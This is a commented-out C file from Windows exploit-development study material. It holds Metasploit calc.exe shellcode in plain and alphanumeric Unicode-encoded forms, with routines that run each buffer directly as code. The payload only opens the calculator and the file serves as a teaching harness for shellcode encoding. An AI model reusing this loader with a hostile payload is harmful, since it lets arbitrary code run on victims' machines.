//// http://www.securitysift.com/windows-exploit-development-part-7-unicode-buffer-overflows/
//
//#include <windows.h>
//#include <stdio.h>
//
//// calc.exe shellcode generated with Metasploit 
//// msfpayload windows/exec cmd=calc R | msfencode -e generic/none -b 0x00
//char ShellA[] =
//"\xdb\xc4\xbb\x80\x2e\x3f\x3a\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x32\x83\xee\xfc\x31\x5e\x13\x03\xde\x3d\xdd\xcf\x22"
//"\xa9\xa8\x30\xda\x2a\xcb\xb9\x3f\x1b\xd9\xde\x34\x0e\xed\x95\x18\xa3\x86\xf8\x88\x30\xea\xd4\xbf\xf1\x41\x03\x8e"
//"\x02\x64\x8b\x5c\xc0\xe6\x77\x9e\x15\xc9\x46\x51\x68\x08\x8e\x8f\x83\x58\x47\xc4\x36\x4d\xec\x98\x8a\x6c\x22\x97"
//"\xb3\x16\x47\x67\x47\xad\x46\xb7\xf8\xba\x01\x2f\x72\xe4\xb1\x4e\x57\xf6\x8e\x19\xdc\xcd\x65\x98\x34\x1c\x85\xab"
//"\x78\xf3\xb8\x04\x75\x0d\xfc\xa2\x66\x78\xf6\xd1\x1b\x7b\xcd\xa8\xc7\x0e\xd0\x0a\x83\xa9\x30\xab\x40\x2f\xb2\xa7"
//"\x2d\x3b\x9c\xab\xb0\xe8\x96\xd7\x39\x0f\x79\x5e\x79\x34\x5d\x3b\xd9\x55\xc4\xe1\x8c\x6a\x16\x4d\x70\xcf\x5c\x7f"
//"\x65\x69\x3f\x15\x78\xfb\x45\x50\x7a\x03\x46\xf2\x13\x32\xcd\x9d\x64\xcb\x04\xda\x9b\x81\x05\x4a\x34\x4c\xdc\xcf"
//"\x59\x6f\x0a\x13\x64\xec\xbf\xeb\x93\xec\xb5\xee\xd8\xaa\x26\x82\x71\x5f\x49\x31\x71\x4a\x2a\xd4\xe1\x16\xad";
//
//// calc.exe shellcode generated with Metasploit 
//// msfpayload windows/exec cmd=calc R | msfencode -e x86/unicode_upper BufferRegister=EAX
//char ShellW[] =
//"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBA"
//"BABABAB30APB944JBKLYX3YKPKPKPC0599UNQXRS4TKR2P0DK1BLLTKPRLTTKRRMXLOFWPJMV01KOP1Y06LOLS1CLLBNLO091HOLMM197ZBL0R2P"
//"WDKR2LPTKOROLM1HPDKOPBXCU90RTOZM1J00P4KPHN84K28O0M1J39SOLPITKNTDKKQXV01KO017PFLWQHOLMKQI7P8IPD5KDLC3MJXOK3MMT45Y"
//"RPXTK28O4KQXSRF4KLLPKDKB8MLM1HS4KM4DKM1Z0U914O4MT1KQK1Q1IQJR1KOK01H1OPZDKMBZKDF1MQZM1DMDE7IKPKPM0PPQXNQ4KRO4GKO8"
//"U7KJP6UFBPVS8W6F57MUMKOIEOLLFCLLJE0KKYPSEKU7K0GN3422O1ZKPQCKOHU1SQQBLBCKPAA";
//
//void fExecShellA(char* pShellin) {
//
//	int(*ret)() = (int(*)())ShellA;
//	ret();
//
//}
//
//void fExecShellW(char* pShellin) {
//
//	PWSTR pShellW;
//	int nLenShellW;
//	UINT nCcp = GetACP(); // get current code page
//
//	nLenShellW = MultiByteToWideChar(nCcp, 0, pShellin, -1, NULL, 0);
//	pShellW = (PWSTR)HeapAlloc(GetProcessHeap(), 0, nLenShellW * sizeof(wchar_t));
//	MultiByteToWideChar(nCcp, 0, pShellin, -1, pShellW, nLenShellW);
//
//	__asm { // mov alpha shellcode to EAX register for decoding
//		mov eax, pShellW;
//		call eax;
//	}
//
//}
//
//int main(int argc, char *argv[]){
//
//	if (argc != 2) {
//		printf("Please supply the arg (A = ANSI, W = Wide, F = Fail)\n");
//		return 0;
//	}
//
//	if (strcmp("A", argv[1]) == 0) {
//		fExecShellA(ShellA);
//	}
//	else if (strcmp("W", argv[1]) == 0){
//		fExecShellW(ShellW);
//	}
//	else if (strcmp("F", argv[1]) == 0){
//		// will try and execute the ANSI shellcode in Unicode and crash 
//		fExecShellW(ShellA);
//	}
//	return 0;
//}
